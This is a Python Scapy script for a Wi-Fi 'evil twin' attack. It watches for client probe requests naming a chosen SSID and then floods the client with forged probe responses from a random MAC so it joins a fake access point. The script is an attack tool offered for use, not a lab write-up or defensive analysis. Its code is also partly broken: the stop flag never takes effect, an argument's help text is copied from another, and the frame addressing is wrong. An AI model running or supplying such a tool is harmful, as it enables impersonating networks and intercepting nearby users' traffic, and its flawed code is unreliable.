
from scapy.all import *
import argparse

parser = argparse.ArgumentParser(prog="Scapy fake channel evil twin attack",
                                 usage="python evilTwin -i wlan0mon -s freewifi",
                                 description="Scapy based wifi fake channel attack")
parser.add_argument("-i", "--Interface", required=True,
                    help="The interface that you want to send packets out of, needs to be set to monitor mode")
parser.add_argument("-s", "--SSID", required=True,
                    help="The interface that you want to send packets out of, needs to be set to monitor mode")

args = parser.parse_args()

iface = args.Interface
stop=0

def is_stopped(null):
    if stop:
        return 

def find_ssid_searched( packet):
    if Dot11ProbeReq in packet and packet.info.decode("utf-8") == args.SSID: 
        stop=1
        attack(packet)


def attack(packet):
    
    packet.show()
    # We create the new packet by concatenate the first part, the new channel, and the last part
    fackpacket = RadioTap() / Dot11(type=0, subtype=5, addr1=packet.addr2, addr2="ff:ff:ff:ff:ff:ff", addr3=RandMAC())/Dot11ProbeResp()/Dot11Elt(ID="SSID", info=args.SSID)
    sendp(fackpacket, iface=iface, inter=0.100, loop=1)

print("Searching SSID equals to {ssid}".format(ssid=args.SSID))
sniff(iface=iface, prn=find_ssid_searched, stop_filter=is_stopped)
